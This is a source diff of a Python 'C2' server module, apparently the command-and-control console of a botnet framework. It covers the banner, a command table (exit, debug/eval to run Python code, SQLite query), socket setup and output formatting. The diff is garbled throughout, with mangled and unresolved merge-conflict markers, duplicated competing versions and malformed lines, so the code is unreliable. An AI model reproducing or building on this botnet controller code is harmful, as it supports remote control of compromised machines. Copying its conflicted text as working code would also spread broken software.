@@ -31,7 +31,6 @@ import core.util as util
 import core.database as database
 import core.security as security
 
-<<<<<<< HEAD
 # packages
 try:
     import cv2
@@ -41,11 +40,11 @@ try:
     import colorama
 except ImportError:
     sys.exit("Error: missing package 'colorama' is required")
-=======
+== == == =
 # globals
 packages = ['cv2', 'colorama', 'SocketServer']
 platforms = ['win32', 'linux2', 'darwin']
->>>>>>> master
+>>>>>> > master
 
 try:
     raw_input          # Python 2
@@ -70,8 +69,8 @@ __banner__ = """
                d8'
 
 """
-<<<<<<< HEAD
-=======
+<< << << < HEAD
+== == == =
 try:
     import colorama
     colorama.init(autoreset=True)
@@ -81,7 +80,7 @@ except ImportError:
     util.log("restarting...")
     os.execv(sys.executable, ['python'] +
              [os.path.abspath(sys.argv[0])] + sys.argv[1:])
->>>>>>> master
+>>>>>> > master
 
 # main
 
@@ -145,8 +144,11 @@ def main():
     )
 
     modules = os.path.abspath('modules')
-<<<<<<< HEAD
-    site_packages = [os.path.abspath(_) for _ in sys.path if os.path.isdir(_) if os.path.basename(_) == 'site-packages'] if len([os.path.abspath(_) for _ in sys.path if os.path.isdir(_) if os.path.basename(_) == 'site-packages']) else [os.path.abspath(_) for _ in sys.path if os.path.isdir(_) if 'local' not in _ if os.path.basename(_) == 'dist-packages']
+
+
+<< << << < HEAD
+    site_packages = [os.path.abspath(_) for _ in sys.path if os.path.isdir(_) if os.path.basename(_) == 'site-packages'] if len([os.path.abspath(_) for _ in sys.path if os.path.isdir(
+        _) if os.path.basename(_) == 'site-packages']) else [os.path.abspath(_) for _ in sys.path if os.path.isdir(_) if 'local' not in _ if os.path.basename(_) == 'dist-packages']
 
     if len(site_packages):
         n = 0
@@ -156,15 +158,16 @@ def main():
                 n = len(os.listdir(path))
                 globals()['packages'] = path
     else:
-        util.log("unable to locate 'site-packages' in sys.path (directory containing user-installed packages/modules)")
-=======
+        util.log(
+            "unable to locate 'site-packages' in sys.path (directory containing user-installed packages/modules)")
+== == == =
     packages = [os.path.abspath(_) for _ in sys.path if os.path.isdir(_) if os.path.basename(_) == 'site-packages'] if len([os.path.abspath(_) for _ in sys.path if os.path.isdir(
         _) if os.path.basename(_) == 'site-packages']) else [os.path.abspath(_) for _ in sys.path if os.path.isdir(_) if 'local' not in _ if os.path.basename(_) == 'dist-packages']
 
     if not len(packages):
         util.log(
             "unable to locate 'site-packages' in sys.path (directory containing user-installed packages/modules)")
->>>>>>> master
+>>>>>> > master
         sys.exit(0)
 
     if not os.path.isdir('data'):
@@ -247,19 +250,19 @@ class C2():
                 'method': self.quit,
                 'usage': 'exit',
                 'description': 'quit the server'},
-<<<<<<< HEAD
+
             'debug' : {
                 'method': self.debug,
                 'usage': 'debug <code>',
                 'description': 'run python code directly on server (debugging MUST be enabled)'},
             'query' : {
-=======
+
             'eval': {
                 'method': self.eval,
                 'usage': 'eval <code>',
                 'description': 'execute python code directly on server (debugging MUST be enabled)'},
             'query': {
->>>>>>> master
+
                 'method': self.query,
                 'usage': 'query <statement>',
                 'description': 'query the SQLite database'},
@@ -330,12 +333,12 @@ class C2():
             max_val = int(max(map(len, [str(i2) for i2 in info.values() if i2 if i2 != 'None'])) + 2) if int(
                 max(map(len, [str(i2) for i2 in info.values() if i2 if i2 != 'None'])) + 2) < 80 else 80
             key_len = {len(str(i2)): str(i2)
-                       for i2 in info.keys() if i2 if i2 != 'None'}
+                    for i2 in info.keys() if i2 if i2 != 'None'}
             keys = {k: key_len[k] for k in sorted(key_len.keys())}
             with lock:
                 for key in keys.values():
                     if info.get(key) and info.get(key) != 'None':
-<<<<<<< HEAD
+
                         try:
                             info[key] = json.loads(key)
                             self._print(info[key])
@@ -345,7 +348,7 @@ class C2():
                             info[key] = str(info.get(key)).replace('\n',' ') if not isinstance(info.get(key), datetime.datetime) else str(key).encode().replace("'", '"').replace('True','true').replace('False','false') if not isinstance(key, datetime.datetime) else str(int(time.mktime(key.timetuple())))
                             util.display('\x20' * 4, end=' ')
                             util.display(key.ljust(max_key).center(max_key + 2) + info[key].ljust(max_val).center(max_val + 2), color=self._text_color, style=self._text_style)
-=======
+
                         if len(str(info.get(key))) > 80:
                             info[key] = str(info.get(key))[:77] + '...'
                         info[key] = str(info.get(key)).replace('\n', ' ') if not isinstance(info.get(key), datetime.datetime) else str(v).encode().replace(
@@ -353,17 +356,17 @@ class C2():
                         util.display('\x20' * 4, end=',')
                         util.display(key.ljust(max_key).center(max_key + 2) + info[key].ljust(
                             max_val).center(max_val + 2), color=self._text_color, style=self._text_style)
->>>>>>> master
+
         else:
             with lock:
-<<<<<<< HEAD
+
                 util.display('\x20' * 4, end=',')
                 util.display(str(info), color=self._text_color,
-                             style=self._text_style)
-=======
+                            style=self._text_style)
+
                 util.display('\x20' * 4, end=' ')
                 util.display(str(info), color=self._text_color, style=self._text_style)
->>>>>>> pr/4
+
 
     def _socket(self, port):
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -382,17 +385,14 @@ class C2():
 
     def _banner(self):
         with self._lock:
-<<<<<<< HEAD
             util.display(__banner__, color=random.choice(
                 ['red', 'green', 'cyan', 'magenta', 'yellow']), style='bright')
             util.display("[?] ", color='yellow', style='bright', end=',')
             util.display("Hint: show usage information with the 'help' command\n",
-                         color='white', style='normal')
-=======
+                        color='white', style='normal')
             util.display(__banner__, color=random.choice(['red','green','cyan','magenta','yellow']), style='bright')
             util.display("[?] ", color='yellow', style='bright', end=' ')
             util.display("Hint: show usage information with the 'help' command\n", color='white', style='normal')
->>>>>>> pr/4
         return __banner__
 
     def _get_arguments(self, data):
@@ -470,7 +470,7 @@ class C2():
         globals()['__abort'] = True
         self._active.clear()
         _ = os.popen("taskkill /pid {} /f".format(os.getpid()) if os.name ==
-                     'nt' else "kill -9 {}".format(os.getpid())).read()
+                    'nt' else "kill -9 {}".format(os.getpid())).read()
         util.display('Exiting...')
         sys.exit(0)
 
@@ -488,23 +488,18 @@ class C2():
         """
         column1 = 'command <arg>'
         column2 = 'description'
-<<<<<<< HEAD
         info = json.loads(info) if info else {command['usage']: command['description'] for command in self.commands.values()}
-<<<<<<< HEAD
-=======
         info = info if info else {
             command['usage']: command['description'] for command in self.commands.values()}
->>>>>>> master
         max_key = max(map(len, info.keys() + [column1])) + 2
         max_val = max(map(len, info.values() + [column2])) + 2
         util.display('\n', end=',')
         util.display(column1.center(max_key) + column2.center(max_val),
-                     color=self._text_color, style='bright')
+                    color=self._text_color, style='bright')
         for key in sorted(info):
             util.display(key.ljust(max_key).center(max_key + 2) + info[key].ljust(
                 max_val).center(max_val + 2), color=self._text_color, style=self._text_style)
         util.display("\n", end=',')
-=======
         max_key = max(map(len, list(info.keys()) + [column1])) + 2
         max_val = max(map(len, list(info.values()) + [column2])) + 2
         util.display('\n', end=' ')
@@ -512,7 +507,6 @@ class C2():
         for key in sorted(info):
             util.display(key.ljust(max_key).center(max_key + 2) + info[key].ljust(max_val).center(max_val + 2), color=self._text_color, style=self._text_style)
         util.display("\n", end=' ')
->>>>>>> pr/4
 
     def display(self, info):
         """
@@ -531,19 +525,16 @@ class C2():
                 if len(info):
                     for data in info:
                         util.display('  %d\n' % int(info.index(data) + 1),
-                                     color=self._text_color, style='bright', end="")
+                                    color=self._text_color, style='bright', end="")
                         self._print(data)
             elif isinstance(info, str):
                 try:
                     self._print(json.loads(info))
                 except:
-<<<<<<< HEAD
                     util.display(str(info), color=self._text_color,
-                                 style=self._text_style)
+                                style=self._text_style)
             else:
-<<<<<<< HEAD
                 util.log("{} error: invalid data type '{}'".format(self.display.func_name, type(info)))
-=======
                     util.display(str(info), color=self._text_color, style=self._text_style)
             elif isinstance(info, bytes):
                 try:
@@ -552,13 +543,10 @@ class C2():
                     util.display(info.decode('utf-8'), color=self._text_color, style=self._text_style)
             else:
                 util.log("{} error: invalid data type '{}'".format(self.display.__name__, type(info)))
->>>>>>> pr/4
             print()
-=======
                 util.log("{} error: invalid data type '{}'".format(
                     self.display.func_name, type(info)))
-            print
->>>>>>> master
+            print()
 
     def query(self, statement):
         """
@@ -584,18 +572,15 @@ class C2():
         prompt_style = [style for style in filter(str.isupper, dir(
             colorama.Style)) if style == self._prompt_style][0]
         util.display('\n\t    OPTIONS', color='white', style='bright')
-<<<<<<< HEAD
         util.display('text color/style: ', color='white',
-                     style='normal', end=',')
+                    style='normal', end=',')
         util.display('/'.join((self._text_color.title(), self._text_style.title())),
-                     color=self._text_color, style=self._text_style)
+                    color=self._text_color, style=self._text_style)
         util.display('prompt color/style: ', color='white',
-                     style='normal', end=',')
+                    style='normal', end=',')
         util.display('/'.join((self._prompt_color.title(), self._prompt_style.title())),
-                     color=self._prompt_color, style=self._prompt_style)
+                    color=self._prompt_color, style=self._prompt_style)
         util.display('debug: ', color='white', style='normal', end=',')
-<<<<<<< HEAD
-=======
         util.display('text color/style: ', color='white', style='normal', end=' ')
         util.display('/'.join((self._text_color.title(), self._text_style.title())), color=self._text_color, style=self._text_style)
         util.display('prompt color/style: ', color='white', style='normal', end=' ')
